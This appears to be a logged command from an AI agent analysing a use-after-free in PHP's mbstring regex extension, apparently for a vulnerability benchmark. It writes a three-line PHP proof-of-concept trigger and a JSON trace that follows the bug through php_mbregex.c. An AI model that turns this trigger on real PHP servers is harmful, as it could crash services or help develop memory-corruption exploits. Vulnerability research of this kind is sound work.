message:
Running command: cd /workspace && cat > poc.php <<'EOF'
<?php
mb_ereg_search_init('abc', 'a');
mb_eregi_replace('a', '', 'a');
var_dump(mb_ereg_search_regs());
?>
EOF
python3 - <<'PY'
import json
trace = [
  {"step":1,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1410,"var":"MBREX(search_re)","code":"if (argc > 1) { MBREX(search_re) = php_mbregex_compile_pattern(arg_pattern, arg_pattern_len, option, MBREX(current_mbctype), syntax); }","note":"The attacker supplies a regex pattern that becomes the module-global search regex."},
  {"step":2,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1540,"var":"MBREX(search_str)","code":"ZVAL_STR_COPY(&MBREX(search_str), arg_str);","note":"The attacker supplies the search subject that is retained in global search state."},
  {"step":3,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_eregi_replace)","line":1127,"var":"regs","code":"onig_region_free(regs, 1); smart_str_free(&out_buf); smart_str_free(&eval_buf);","note":"A second mbstring regex API manipulates and frees regex/region objects, leaving the search globals stale."},
  {"step":4,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"_php_mb_regex_ereg_search_exec","line":1458,"var":"MBREX(search_regs)","code":"if (MBREX(search_regs)) { onig_region_free(MBREX(search_regs), 1); } MBREX(search_regs) = onig_region_new();","note":"The search helper frees the old region and creates a new one before using the stored regex pointer again."},
  {"step":5,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"_php_mb_regex_ereg_search_exec","line":1468,"var":"MBREX(search_re)","code":"if (onig_number_of_names(MBREX(search_re)) > 0) { ... onig_foreach_name(MBREX(search_re), mb_regex_groups_iter, &args); }","note":"When the search result is processed, the code walks the stored regex object's metadata, which becomes a use-after-free if the previous call invalidated it."},
  {"step":6,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"_php_mb_regex_ereg_search_exec","line":1438,"var":"MBREX(search_re)","code":"err = _php_mb_onig_search(MBREX(search_re), str, str + len, str + pos, str + len, MBREX(search_regs), 0);","note":"The actual search uses the module-global compiled regex pointer, triggering the sanitizer-observed UAF read when that pointer is stale."}
]
with open('/workspace/candidate_trace.json','w') as f:
    json.dump(trace,f,separators=(',',':'))
PY
php -d detect_unicode=0 -r 'echo "ok\n";' >/dev/null 2>&1 || true
ls -l /workspace/poc.php /workspace/candidate_trace.json && tail -c +1 /workspace/poc.php && echo '---TRACE---' && cat /workspace/candidate_trace.json
